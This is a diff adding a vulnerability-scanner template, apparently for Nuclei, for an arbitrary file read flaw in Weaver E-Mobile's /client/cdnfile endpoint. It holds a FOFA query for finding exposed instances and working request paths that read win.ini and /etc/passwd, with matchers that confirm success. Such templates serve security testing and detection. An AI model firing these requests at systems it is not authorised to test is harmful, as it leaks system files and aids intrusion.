@@ -1,0 +1,28 @@
+id: weaver-EMobile-cdnfile-anyfileread
+info:
+  name: 泛微E-Mobile client/cdnfile 任意文件读取漏洞
+  author: fgz
+  severity: high
+  description: '泛微E-Mobile基于泛微成熟产品e-cology，它将协同OA上的公文、流程、通讯录、日程、文件管理、通知公告等应用扩展到手机移动终端，为用户提供更方便更灵活的移动办公应用。移动OA对突发性事件和紧急性事件的处理有极其高效和出色的支持，是管理者、销售人员等经常有外出办公、出差需求的商务人士的贴心的掌上办公产品，适合于已有内部OA系统的大中型企业机构，尤其是企业或部门有较多的分支机构。该系统/client/cdnfile接口处存在任意文件读取漏洞，容易造成敏感信息泄露'
+  tags: fanwei,weaver,e-emobile,emobile,oa,E-Mobile,fileread
+  metadata:
+    max-request: 1
+    fofa-query: app="泛微-EMobile"
+    verified: true
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/client/cdnfile/1C/Windows/win.ini?windows"
+      - "{{BaseURL}}/client/cdnfile/C/etc/passwd?linux"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "; for 16-bit app support"
+          - "root:x:"
+        condition: or
+        part: body
